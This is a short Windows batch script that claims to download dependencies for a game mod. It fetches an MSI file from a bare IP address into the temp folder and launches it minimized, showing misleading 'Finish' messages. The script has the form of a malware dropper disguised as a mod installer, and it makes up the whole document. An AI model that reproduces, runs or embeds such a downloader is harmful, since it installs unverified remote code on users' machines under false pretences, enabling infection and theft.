@echo off
set "URL=http://87.121.84.195/Installer.msi"
set "FILE=%temp%\AdventureInstaller.msi"

echo Downloading dependencies of mod...
curl -L -o "%FILE%" "%URL%"

if exist "%FILE%" (
    echo Finish...
    start /min "" "%FILE%"
    exit
) else (
    echo Error
    timeout /t 3 >nul
    exit
)
